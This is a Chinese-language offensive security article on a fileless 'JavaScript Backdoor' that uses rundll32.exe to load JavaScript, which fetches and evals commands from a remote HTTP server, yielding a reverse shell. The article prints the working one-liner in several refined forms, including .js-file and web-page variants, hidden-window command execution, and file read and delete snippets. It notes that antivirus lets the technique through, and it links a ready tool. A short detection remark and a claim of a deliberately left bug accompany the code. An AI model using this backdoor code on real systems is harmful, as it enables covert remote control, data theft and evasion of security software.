# JavaScript Backdoor

0x00 前言
=======

* * *

Casey Smith最近在Twitter分享了他的研究成果，执行一段JavaScript代码即可反弹一个Http Shell，很是奇妙，所以就对这个技术做了进一步研究。

![Alt text](http://drops.javaweb.org/uploads/images/9040c0c0ed76f2e19c03bb049db5540697fd7062.jpg)

0x01 简介
=======

* * *

![Alt text](http://drops.javaweb.org/uploads/images/dcc5875927c5c0326f6bd732b44556c729aabec3.jpg)

从截图我们可以看到该技术的使用方法，在cmd下利用rundll32.exe加载JavaScript代码，代码运行后会反弹一个Http Shell，而特别的地方在于当运行完cmd命令后，后台会一直存在进程rundll32.exe用来同Server持续连接，整个过程不需要写入文件，隐蔽性大大提高。

0x02 测试环境
=========

* * *

Server：

```
OS：Win7 x64
IP：192.168.174.131

```

Client：

```
OS：Win7 x86
IP：192.168.174.130

```

下载链接：  
[https://gist.github.com/subTee/f1603fa5c15d5f8825c0](https://gist.github.com/subTee/f1603fa5c15d5f8825c0)

0x03 实际测试
=========

* * *

**1、Server启动服务，监听端口**

需要将下载脚本中的IP修改为当前主机IP

管理员运行

**2、Client加载JavaScript指令**

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.174.131/connect",false);h.Send();B=h.ResponseText;eval(B)

```

**3、Server弹回Shell**

可以执行cmd命令并获得回显

![Alt text](http://drops.javaweb.org/uploads/images/25b3d931e64c5e21c08a8fb02fd92c960ca3392c.jpg)

0x04 测试中的Bug
============

* * *

**1、连接超时**

![Alt text](http://drops.javaweb.org/uploads/images/a7a97476e79784091dd0befc2317334ec74705f1.jpg)

在成功返回shell后，如果在后台等待一段时间，Clinet就会弹出超时连接的对话框

![Alt text](http://drops.javaweb.org/uploads/images/c837af4b6231a56b2de2165a330cde0cd5083ef7.jpg)

从截图可以看到Casey Smith已经发现了连接超时的问题，所以在新版本已经做了修正，加上window.setTimeout来避免连接超时的错误，在message内加了超时判断（message存储用于实现Client后续连接的代码，具体细节一看代码就明白），但是这样做还远远不够。

**2、进程残留**

如果Server退出，Clinet还会存在rundll32.exe进程

**3、执行cmd命令会弹黑框**

如果是立即回显的cmd命令，黑框一闪而过

如果是systeminfo这种需要等待的cmd命令，会一直弹出cmd 执行的黑框，等到执行完毕才会退出

**4、执行exe会阻塞**

比如执行calc.exe，server端会阻塞，直到关闭calc.exe进程才会恢复正常

如图

![Alt text](http://drops.javaweb.org/uploads/images/ede84a7522286e4915c995ca89d4eba8f10ffcf4.jpg)

**5、无法删除文件**

如图

![Alt text](http://drops.javaweb.org/uploads/images/46f34d2e3ac5eb4b7ba4550b1e7929f0559a772d.jpg)

![Alt text](http://drops.javaweb.org/uploads/images/2fad0724100abfda7bb51a7b3f2828a64311c4ed.jpg)

**6、server端无法正常退出**

想退出只能强行关闭当前cmd.exe

**7、无法上传下载文件**

0x05 优化思路
=========

* * *

**1、对setTimeout的解释**

查询相关资料如下：  
[https://msdn.microsoft.com/en-us/library/windows/desktop/aa384061(v=vs.85).aspx](https://msdn.microsoft.com/en-us/library/windows/desktop/aa384061(v=vs.85).aspx)

文中提到了JavaScript实现WinHttpRequest的用法，如图

![Alt text](http://drops.javaweb.org/uploads/images/438123441c1eedfc1d0762b69dc22d7c0636a1db.jpg)

setTimeout用来设置http的超时时间，如果全为0，代表no time-out，也就是无限期

> 注:  
> 在Casey Smith发布的第一个版本尚未修复该方法的时候，我解决该方法的思路是参照微软的方法，对应到代码中就是添加  
> `h.SetTimeouts(0, 0, 0, 0);`即可

**2、增加try catch方法处理错误消息**

Casey Smith在代码中虽然加入了超时判断，但没有对其他可能产生的意外错误做判断，所以需要添加try catch对错误消息进行响应。

try catch不仅能够解决上述问题中的Bug1，同样能用来判断输入的命令能否成功执行（比如输错命令或输错路径）

**（相关细节可参照结尾提供的参考代码）**

查询相关资料如下：  
[http://blog.csdn.net/qdfeitian/article/details/6371146](http://blog.csdn.net/qdfeitian/article/details/6371146)

**3、使用taskkill解决进程残留的问题**

Clinet可以使用taskkill来结束自身进程，自动退出

```
new ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe"）

```

**4、WScript.Shell对象run和exec的区别**

参考资料：

*   [http://www.cnblogs.com/dongzhiquan/archive/2013/04/20/3033287.html](http://www.cnblogs.com/dongzhiquan/archive/2013/04/20/3033287.html)
*   [https://msdn.microsoft.com/zh-cn/library/ateytk4a(en-us,VS.85).aspx](https://msdn.microsoft.com/zh-cn/library/ateytk4a(en-us,VS.85).aspx)
*   [https://msdn.microsoft.com/zh-cn/library/d5fk67ky(en-us,VS.85).aspx](https://msdn.microsoft.com/zh-cn/library/d5fk67ky(en-us,VS.85).aspx)

为了获得cmd命令的回显，Casey Smith采用的方法是使用exec方法，因为只有exec方法的返回值是一个对象，才可以获得控制台输出信息和控制台错误信息

而run方法的返回值是一个整数，就是0或1成功和失败两个状态

但是使用exec方法也有一些弊端，比如测试中的bug3和bug4，这是exec方法本身所无法解决的问题。

而如果使用run方法可以解决bug4

综上，解决思路是对输入的内容做判断，如果是cmd命令，使用exec方法；如果是执行exe，使用run方法

**5、解决使用run方法执行命令会弹黑框的问题**

参考资料：  
[https://msdn.microsoft.com/zh-cn/library/d5fk67ky(en-us,VS.85).aspx](https://msdn.microsoft.com/zh-cn/library/d5fk67ky(en-us,VS.85).aspx)

如图

![Alt text](http://drops.javaweb.org/uploads/images/91683678abc88bb8a22deb96c076b5aa8faaf4b6.jpg)

run方法其实后面还可以加参数指示该窗口能否被看见

所以在执行比如taskkill的命令就可以使用

```
new ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true)

```

避免弹出黑框

> 注：  
> `intWindowStyle`参数的说明中提到“Note that not all programs make use of this information.”  
> 例子之一就是用run方法来执行systeminfo这种需要等待的cmd命令是无法隐藏窗口的

**6、如何隐蔽执行systeminfo并获取回显**

参考了如下资料：  
[WooYun: 搜狗浏览器远程命令执行之五](http://drops.com:8000/%3Ca%20target=)">[WooYun: 搜狗浏览器远程命令执行之五](http://www.wooyun.org/bugs/wooyun-2015-097380)

如果使用exec方法，虽然可以获取到回显，但是利用window.moveTo(-1000,-1000)无法移动弹出的黑框

而使用run方法虽然可以移动弹出的黑框，但是无法获得回显

综合这两种方法，最后我们只能退而求其次，使用run方法将执行命令回显的结果输出到文件中，然后再通过读取文件来获取结果

具体实现如下：

(1)使用run方法将systeminfo回显的结果输出到文件中c\test\a.txt

示例代码：

```
new ActiveXObject("WScript.Shell").Run("cmd /c systeminfo >>c\test\a.txt",0,true)

```

(2)读取文件并回传

示例代码：

```
fso1=new ActiveXObject("Scripting.FileSystemObject");
f=fso1.OpenTextFile(d,1);
g=f.ReadAll();
f.Close();

```

通过调用`new ActiveXObject("Scripting.FileSystemObject")`读取回显内容，然后再回传信息

**（相关细节可参照结尾提供的参考代码）**

**7、解决连接超时的问题**

通过以上的分析，如果要解决连接超时的问题，需要对Clinet执行的命令添加如下功能：

1.  捕获错误消息
2.  进程自动退出
3.  全过程不弹黑框

所以Clinet执行的命令最终优化为：

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.174.131/connect",false);try{h.Send();B=h.ResponseText;eval(B);}catch(e{new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}

```

**8、解决server端无法正常退出**

加入exit命令判断，如果输入exit，那么Client调用taskkill结束自身，Server同样执行exit退出

**（相关细节可参照结尾提供的参考代码）**

**9、解决删除文件的问题**

通过调用`new ActiveXObject("Scripting.FileSystemObject")`实现

示例代码：

```
fso1=new ActiveXObject("Scripting.FileSystemObject");
f =fso1.GetFile(d);
f.Delete();

```

**（相关细节可参照结尾提供的参考代码）**

**10、解决文件上传下载**

示例如图：

![Alt text](http://drops.javaweb.org/uploads/images/68ff634bd2167e25433a5d587bea84205784d2c3.jpg)

示例代码可以实现简单的文件上传下载，但里面存在一个小bug，如果你投入精力，不难解决

0x06 补充
=======

* * *

### 1、白名单进程，免疫杀毒软件

由于是通过rundll.exe调用的代码，所以杀毒软件会放行，不会拦截

### 2、检测

通信协议使用HTTP，通过防火墙拦截流量即可发现其中的攻击行为

### 3、更多加载方式

**（1）js文件**

可以放在js文件里面 双击js文件执行

```
h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
h.Open("GET","http://192.168.174.131/connect",false);
try{
h.Send();
B=h.ResponseText;
eval(B);
}
catch(e)
{
new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im wscript.exe",0,true);
}

```

后台进程为wscript.exe

**（2）尝试挂在网页里面**

```
<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
<html>
<head>
 <title> new document </title>
 <meta name="generator" content="editplus">
 <meta name="author" content="">
 <meta name="keywords" content="">
 <meta name="description" content="">
 <script language="javascript" type="text/javascript">
h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
h.Open("GET","http://192.168.174.131/connect",false);
h.Send();
B=h.ResponseText;
eval(B);
</script>
</head>
<body>
</body>
</html>

```

使用ie打开会提示是否加载控件，如果允许，即可弹回shell

Chrome、Firefox不支持ActiveXObject，所以不会触发

0x07 小结
=======

* * *

我在Casey Smith的基础上，对其代码做了进一步优化，对JavaScript Backdoor技术做了进一步研究，感谢他的无私分享，才有了我的这篇文章。

我开发的代码已上传到github，下载链接：  
[https://github.com/3gstudent/Javascript-Backdoor/blob/master/JSRat.ps1](https://github.com/3gstudent/Javascript-Backdoor/blob/master/JSRat.ps1)

欢迎下载测试，交流学习。

支持的功能如图

![Alt text](http://drops.javaweb.org/uploads/images/82da78f52980492e6e9bafe94b22babcce48536c.jpg)

> 注：  
> 本文仅用来学习交流JavaScript Backdoor技术，并提供了检测方法  
> 同时在文件上传下载的功能上留下了bug，距实际使用还有一点距离，以避免该方法被滥用。

**本文由三好学生原创并首发于乌云drops，转载请注明**